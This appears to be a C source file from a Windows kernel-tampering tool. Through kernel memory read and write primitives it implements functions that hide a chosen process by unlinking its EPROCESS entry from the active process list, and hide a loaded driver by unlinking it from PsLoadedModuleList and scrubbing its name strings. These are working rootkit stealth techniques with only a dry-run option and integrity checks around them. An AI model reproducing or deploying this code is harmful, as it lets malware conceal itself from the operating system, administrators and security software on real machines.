#include "ft.h"

#include <string.h>

#define KLDR_INLOAD   0x00
#define KLDR_INMEM    0x10
#define KLDR_ININIT   0x20
#define KLDR_DLLBASE  0x30
#define KLDR_SIZE     0x40
#define KLDR_FULLNAME 0x48
#define KLDR_BASENAME 0x58

#define US_LENGTH     0x00
#define US_BUFFER     0x08

static int ft_unlink_eproc(ft_ctx* c, uint64_t entry, uint64_t head) {
    uint64_t flink = 0, blink = 0, back = 0, fwd = 0;
    uint64_t next_blink_slot;

    if (ft_km_read64(c, entry, &flink) != FTR_VAL) return -1;
    if (ft_km_read64(c, entry + 8, &blink) != FTR_VAL) return -2;
    if (flink == 0 || blink == 0) return -3;
    if (flink == entry && blink == entry) return 0;

    if (flink == head + 8) {

        if (ft_km_read64(c, flink, &back) != FTR_VAL) return -4;
        if (back != entry) return -5;
    } else {
        if (ft_km_read64(c, flink + 8, &back) != FTR_VAL) return -4;
        if (back != entry) return -5;
    }
    if (ft_km_read64(c, blink, &fwd) != FTR_VAL) return -6;
    if (fwd != entry) return -7;

    next_blink_slot = (flink == head + 8) ? (head + 8) : (flink + 8);

    if (ft_km_write64(c, next_blink_slot, blink) != 1) return -8;
    if (ft_km_write64(c, blink, flink) != 1) return -9;
    if (ft_km_write64(c, entry, entry) != 1) return -10;
    if (ft_km_write64(c, entry + 8, entry) != 1) return -11;
    return 0;
}

static int ft_unlink_eproc_checked(ft_ctx* c, uint64_t entry, uint64_t head) {
    int rc = ft_unlink_eproc(c, entry, head);
    if (rc != 0) return rc;
    {
        uint64_t flink = 0, blink = 0;
        if (ft_km_read64(c, entry, &flink) != FTR_VAL) return -20;
        if (ft_km_read64(c, entry + 8, &blink) != FTR_VAL) return -21;
        if (flink != entry || blink != entry) return -22;
        if (flink == entry) return 0;
    }
    return 0;
}

static int ft_kldr_link_ok(ft_ctx* c, uint64_t link_addr, uint32_t list_off) {
    uint64_t dbase = 0;
    if (link_addr < 0x1000ull) return 0;
    if (ft_km_read64(c, link_addr - list_off + KLDR_DLLBASE, &dbase) != FTR_VAL) return 0;
    return ft_is_kernel_ptr(dbase);
}

static int ft_unlink_kldr(ft_ctx* c, uint64_t entry, uint32_t list_off, uint64_t head) {
    uint64_t link = entry + list_off;
    uint64_t flink = 0, blink = 0;
    uint64_t next_blink_slot;

    if (ft_km_read64(c, link, &flink) != FTR_VAL) return -1;
    if (ft_km_read64(c, link + 8, &blink) != FTR_VAL) return -2;
    if (flink == 0 || blink == 0) return -3;
    if (flink == link && blink == link) return 0;

    if (head) {
        uint64_t back = 0, fwd = 0;
        if (flink == head + 8) {

            if (ft_km_read64(c, flink, &back) != FTR_VAL) return -4;
            if (back != link) return -5;
        } else {
            if (ft_km_read64(c, flink + 8, &back) != FTR_VAL) return -4;
            if (back != link) return -5;
        }
        if (ft_km_read64(c, blink, &fwd) != FTR_VAL) return -6;
        if (fwd != link) return -7;
        next_blink_slot = (flink == head + 8) ? (head + 8) : (flink + 8);
    } else {

        if (ft_kldr_link_ok(c, flink, list_off)) {
            next_blink_slot = flink + 8;
        } else {
            uint64_t v = 0;
            if (ft_km_read64(c, flink, &v) != FTR_VAL) return -8;
            if (!ft_kldr_link_ok(c, v, list_off)) return -9;
            next_blink_slot = flink;
        }
    }

    if (ft_km_write64(c, next_blink_slot, blink) != 1) return -10;
    if (ft_km_write64(c, blink, flink) != 1) return -11;
    if (ft_km_write64(c, link, link) != 1) return -12;
    if (ft_km_write64(c, link + 8, link) != 1) return -13;
    return 0;
}

static int ft_unlink_kldr_checked(ft_ctx* c, uint64_t entry, uint32_t list_off,
                                  uint64_t head) {
    int rc = ft_unlink_kldr(c, entry, list_off, head);
    if (rc != 0) return rc;
    {
        uint64_t link = entry + list_off;
        uint64_t flink = 0, blink = 0;
        if (ft_km_read64(c, link, &flink) != FTR_VAL) return -20;
        if (ft_km_read64(c, link + 8, &blink) != FTR_VAL) return -21;
        if (flink != link || blink != link) return -22;
    }
    return 0;
}

static void ft_scrub_ustr(ft_ctx* c, uint64_t us_addr) {
    uint32_t len = 0;
    uint64_t buf = 0;
    unsigned char zeros[256];

    if (ft_km_read32(c, us_addr + US_LENGTH, &len) != FTR_VAL) return;
    len &= 0xFFFFu;
    if (len == 0 || len > 1024) return;
    if (ft_km_read64(c, us_addr + US_BUFFER, &buf) != FTR_VAL) return;
    if (!ft_is_kernel_ptr(buf)) return;
    memset(zeros, 0, sizeof zeros);
    while (len > 0) {
        uint64_t chunk = 0;
        size_t take = (len > 8u) ? 8u : (size_t)len;
        chunk = 0;
        memcpy(&chunk, zeros, 8);
        if (ft_km_write(c, buf, &chunk, take) != 1) return;
        buf += (uint64_t)take;
        len -= (uint32_t)take;
    }
}

int ft_hide_process(ft_ctx* c, uint32_t pid) {
    uint64_t eproc = 0;
    uint64_t entry;
    uint64_t flink = 0, blink = 0;
    uint64_t back = 0, fwd = 0;
    int rc;
    ft_sb f;

    if (!c) return FT_E_INTERNAL;
    if (pid == 0) return FT_E_ARGS;

    if (ft_proc_find_by_pid(c, pid, &eproc) != 1 || !eproc) {
        ft_err(c, "hide_proc_notfound", "\"pid\":%u", pid);
        return FT_E_TARGET;
    }
    entry = eproc + c->ep_links_off;

    if (ft_km_read64(c, entry, &flink) != FTR_VAL ||
        ft_km_read64(c, entry + 8, &blink) != FTR_VAL) {
        ft_err(c, "hide_proc_read", "\"pid\":%u", pid);
        return FT_E_VALIDATE;
    }
    if (flink == entry && blink == entry) {
        ft_ok(c, "hide_proc_already", "\"pid\":%u,\"eproc\":\"0x%llx\"",
              pid, (unsigned long long)eproc);
        return FT_OK;
    }
    if (flink == 0 || blink == 0) {
        ft_err(c, "hide_proc_badlink", "\"pid\":%u", pid);
        return FT_E_VALIDATE;
    }

    {
        uint64_t head = c->sys_ep + c->ep_links_off;
        if (flink == head + 8) {
            if (ft_km_read64(c, flink, &back) != FTR_VAL || back != entry) {
                ft_err(c, "hide_proc_integrity_fwd", "\"pid\":%u", pid);
                return FT_E_VALIDATE;
            }
        } else if (ft_km_read64(c, flink + 8, &back) != FTR_VAL || back != entry) {
            ft_err(c, "hide_proc_integrity_fwd", "\"pid\":%u", pid);
            return FT_E_VALIDATE;
        }
    }
    if (ft_km_read64(c, blink, &fwd) != FTR_VAL || fwd != entry) {
        ft_err(c, "hide_proc_integrity_bwd", "\"pid\":%u", pid);
        return FT_E_VALIDATE;
    }

    if (c->dry_run) {
        ft_ok(c, "hide_proc_dryrun", "\"pid\":%u,\"eproc\":\"0x%llx\"",
              pid, (unsigned long long)eproc);
        return FT_OK;
    }

    rc = ft_unlink_eproc_checked(c, entry, c->sys_ep + c->ep_links_off);
    if (rc != 0) {
        ft_err(c, "hide_proc_unlink", "\"pid\":%u,\"rc\":%d", pid, rc);
        return FT_E_VERIFY;
    }

    if (ft_proc_find_by_pid(c, pid, NULL) == 1) {
        ft_err(c, "hide_proc_still_listed", "\"pid\":%u", pid);
        return FT_E_VERIFY;
    }

    ft_sb_init(&f);
    ft_sb_addf(&f, "\"pid\":%u,\"eproc\":\"0x%llx\",\"flink\":\"0x%llx\",\"blink\":\"0x%llx\"",
               pid, (unsigned long long)eproc, (unsigned long long)flink,
               (unsigned long long)blink);
    ft_ok(c, "hide_proc", f.buf);
    ft_sb_free(&f);
    return FT_OK;
}

static int ft_modlist_head(ft_ctx* c, uint64_t* head_addr, uint64_t* first) {
    uint32_t rva = 0;
    uint64_t h = 0;
    uint64_t f = 0;
    uint64_t dbase = 0;

    if (!ft_ntos_export_rva(c, "PsLoadedModuleList", &rva) || rva == 0) return 0;
    h = ft_ntos_base(c) + rva;
    if (ft_km_read64(c, h, &f) != FTR_VAL || !ft_is_kernel_ptr(f)) return 0;

    if (ft_km_read64(c, f + KLDR_DLLBASE, &dbase) != FTR_VAL) return 0;
    if (dbase != ft_ntos_base(c)) return 0;
    *head_addr = h;
    *first = f;
    return 1;
}

static int ft_read_ustr(ft_ctx* c, uint64_t us_addr, char* out, size_t cap) {
    uint32_t len = 0;
    uint64_t buf = 0;
    unsigned char raw[512];
    uint32_t i;
    size_t n = 0;

    if (!out || cap == 0) return 0;
    out[0] = '\0';
    {
        ft_rr r = ft_km_read32(c, us_addr + US_LENGTH, &len);
        if (r == FTR_FAIL) return 0;
    }
    len &= 0xFFFFu;
    if (len == 0 || len > 510) return 0;
    if (ft_km_read64(c, us_addr + US_BUFFER, &buf) != FTR_VAL) return 0;
    if (!ft_is_kernel_ptr(buf)) return 0;
    if (ft_km_read_bytes(c, buf, raw, (size_t)len) == FTR_FAIL) return 0;
    for (i = 0; i + 1 < len; i += 2) {
        unsigned int ch = (unsigned int)raw[i] | ((unsigned int)raw[i + 1] << 8);
        if (ch == 0) break;
        if (ch > 0x7F) ch = '?';
        if (n + 1 >= cap) break;
        out[n++] = (char)ch;
    }
    out[n] = '\0';
    return (n > 0) ? 1 : 0;
}

static int ft_name_matches(const char* have, const char* want) {
    size_t hl, wl;
    if (!have || !want) return 0;
    hl = strlen(have);
    wl = strlen(want);
    if (hl == 0 || wl == 0) return 0;
    if (_stricmp(have, want) == 0) return 1;

    if (hl + 4 == wl && _strnicmp(have, want, hl) == 0 &&
        (strcmp(want + hl, ".sys") == 0 || strcmp(want + hl, ".SYS") == 0)) {
        return 1;
    }
    if (wl + 4 == hl && _strnicmp(want, have, wl) == 0 &&
        (strcmp(have + wl, ".sys") == 0 || strcmp(have + wl, ".SYS") == 0)) {
        return 1;
    }
    return 0;
}

static int ft_find_module_entry(ft_ctx* c, const char* name, uint64_t* entry,
                                uint64_t* base, uint64_t* size) {
    uint64_t head = 0, cur = 0;
    int i;

    if (!ft_modlist_head(c, &head, &cur)) return 0;
    for (i = 0; i < 4096; i++) {
        char base_name[FT_MAX_NAME];
        uint64_t dbase = 0;
        uint64_t isize = 0;
        uint32_t sz = 0;

        if (cur == 0 || cur == head || cur == head + 8) return 0;
        if (ft_km_read64(c, cur + KLDR_DLLBASE, &dbase) != FTR_VAL) return 0;
        if (!ft_is_kernel_ptr(dbase)) return 0;
        if (ft_km_read32(c, cur + KLDR_SIZE, &sz) != FTR_VAL) sz = 0;
        isize = (uint64_t)sz;
        if (ft_read_ustr(c, cur + KLDR_BASENAME, base_name, sizeof base_name)) {
            if (ft_name_matches(base_name, name)) {
                if (entry) *entry = cur;
                if (base) *base = dbase;
                if (size) *size = isize;
                return 1;
            }
        }
        if (ft_km_read64(c, cur, &cur) != FTR_VAL) return 0;
    }
    return 0;
}

int ft_mod_range(ft_ctx* c, const char* name, uint64_t* base, uint64_t* size) {
    uint64_t entry = 0, b = 0, s = 0;
    if (!ft_find_module_entry(c, name, &entry, &b, &s)) {

        if (!ft_km_module_base(c, name, &b)) return 0;
        s = 0;
    }
    if (base) *base = b;
    if (size) *size = s;
    return 1;
}

int ft_hide_driver(ft_ctx* c, const char* name) {
    uint64_t entry = 0, base = 0, size = 0;
    uint64_t load_head = 0, first = 0;
    int rc;
    ft_sb f;

    if (!c || !name || !*name) return FT_E_ARGS;

    if (!ft_find_module_entry(c, name, &entry, &base, &size)) {
        ft_err(c, "hide_drv_notfound", "\"name\":\"%s\"", name);
        return FT_E_TARGET;
    }
    if (!ft_modlist_head(c, &load_head, &first)) {
        ft_err(c, "hide_drv_no_modlist", "\"name\":\"%s\"", name);
        return FT_E_BUILD;
    }

    if (c->dry_run) {
        ft_ok(c, "hide_drv_dryrun",
              "\"name\":\"%s\",\"entry\":\"0x%llx\",\"base\":\"0x%llx\",\"size\":%llu",
              name, (unsigned long long)entry, (unsigned long long)base,
              (unsigned long long)size);
        return FT_OK;
    }

    rc = ft_unlink_kldr_checked(c, entry, KLDR_INLOAD, load_head);
    if (rc != 0) {
        ft_err(c, "hide_drv_unlink_load", "\"name\":\"%s\",\"rc\":%d", name, rc);
        return FT_E_VERIFY;
    }

    ft_info(c, "hide_drv_inload_only", "\"name\":\"%s\"", name);

    ft_scrub_ustr(c, entry + KLDR_FULLNAME);
    ft_scrub_ustr(c, entry + KLDR_BASENAME);
    if (ft_km_write64(c, entry + KLDR_FULLNAME, 0) != 1 ||
        ft_km_write64(c, entry + KLDR_FULLNAME + 8, 0) != 1 ||
        ft_km_write64(c, entry + KLDR_BASENAME, 0) != 1 ||
        ft_km_write64(c, entry + KLDR_BASENAME + 0x8, 0) != 1) {
        ft_warn(c, "hide_drv_scrub_failed", "\"name\":\"%s\"", name);
    } else {
        ft_info(c, "hide_drv_scrubbed", "\"name\":\"%s\"", name);
    }

    {
        uint64_t e2 = 0;
        if (ft_find_module_entry(c, name, &e2, NULL, NULL)) {
            ft_err(c, "hide_drv_still_listed", "\"name\":\"%s\"", name);
            return FT_E_VERIFY;
        }
    }

    ft_sb_init(&f);
    ft_sb_addf(&f, "\"name\":\"%s\",\"entry\":\"0x%llx\",\"base\":\"0x%llx\",\"size\":%llu",
               name, (unsigned long long)entry, (unsigned long long)base,
               (unsigned long long)size);
    ft_ok(c, "hide_drv", f.buf);
    ft_sb_free(&f);
    return FT_OK;
}
